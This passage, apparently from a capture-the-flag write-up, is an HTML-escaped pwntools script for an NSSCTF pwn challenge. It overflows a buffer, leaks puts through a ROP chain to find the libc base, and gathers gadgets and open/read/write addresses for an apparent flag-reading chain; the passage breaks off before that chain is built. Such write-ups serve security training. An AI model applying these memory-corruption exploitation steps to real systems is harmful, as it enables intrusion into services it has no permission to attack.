ort *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node5.anna.nssctf.cn&quot;,28360)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">pop_rdi=0x0000000000400ad3</span><br><span class="line">pop_rsi_r15=0x0000000000400ad1</span><br><span class="line">ret=0x0000000000400726</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(&quot;read\n&quot;,&quot;-1&quot;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x28</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(0x400760)+p64(elf.sym[&quot;vuln&quot;])</span><br><span class="line">r.sendlineafter(&quot;read:\n&quot;,payload)</span><br><span class="line">libc.address=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-libc.sym[&quot;puts&quot;]</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">read_addr=libc.sym[&quot;read&quot;]</span><br><span class="line">open_addr=libc.sym[&quot;open&quot;]</span><br><span class="line">puts_addr=libc.sym[&quot;puts&quot;]</span><br><span class="line">write_addr=libc.sym[&quot;write&quot;]</span><br><span class="line"></span><br><span class="line">flag_addr=0x601046</span><br><span class="line">pop_rdi=libc.address+0x000000000002a3e5</span><br><span class="line">pop_rsi=libc.address+0x000000000002be51</span><br><span class="line">pop_rdx_r12=libc.address+0x000000000011f497</span><br><span class="line">buf_addr=0x601000</span><br><span class="line"></span><br><span class="line"
